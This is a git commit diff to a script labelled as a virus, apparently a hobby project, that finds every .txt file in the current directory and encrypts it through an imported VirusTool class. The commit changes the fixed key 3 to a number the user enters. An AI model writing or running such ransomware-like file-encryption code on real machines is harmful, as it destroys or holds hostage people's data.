b21fead5568aeedf01640fc97233b0b4242da533
Faysal <82079632+FJay81@users.noreply.github.com>
2022-04-13 08:50:36 +0100

    Update VirusEncrypt_txt.py

--- Virus/VirusEncrypt_txt.py
+++ Virus/VirusEncrypt_txt.py
@@ -1,5 +1,6 @@
 from VirusTool import Naming
 import glob
+RN = int(input("Enter a random number:\n"))
 for files in glob.glob("*.txt"):
     file = Naming(files)
-    file.encrypt(3)
+    file.encrypt(RN)
